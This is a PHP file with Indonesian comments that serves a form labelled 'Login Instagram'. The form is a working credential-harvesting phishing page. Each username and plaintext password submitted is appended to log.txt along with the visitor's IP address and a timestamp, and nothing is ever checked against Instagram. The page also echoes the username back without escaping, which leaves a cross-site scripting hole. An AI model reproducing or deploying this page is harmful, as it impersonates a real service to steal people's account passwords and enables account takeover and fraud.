<?php
// Mulai proses hanya jika form dikirim
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Tangkap input dari user
    $inputUsername = $_POST['username'];
    $inputPassword = $_POST['password'];
    $ipAddress = $_SERVER['REMOTE_ADDR']; // Tangkap IP pengguna
    $timestamp = date('Y-m-d H:i:s'); // Waktu saat login

    // Buat log entry
    $logEntry = "Username: $inputUsername | Password: $inputPassword | IP: $ipAddress | Waktu: $timestamp\n";

    // Simpan ke file log.txt
    file_put_contents("log.txt", $logEntry, FILE_APPEND);

    // Tampilkan pesan sukses
    $message = "Terima kasih, $inputUsername. Data login telah dicatat.";
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Form Login Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            height: 100vh;
            justify-content: center;
            align-items: center;
        }
        .login-form {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 10px rgba(0,0,0,0.15);
            width: 300px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            width: 100%;
            background: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #45a049;
        }
        .message {
            margin-top: 15px;
            font-weight: bold;
            color: blue;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="login-form">
    <form method="POST">
        <h2>Login Instagram</h2>
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Kirim</button>

        <?php 
        if (isset($message)) {
            echo "<div class='message'>$message</div>";
        }
        ?>
    </form>
</div>

</body>
</html>
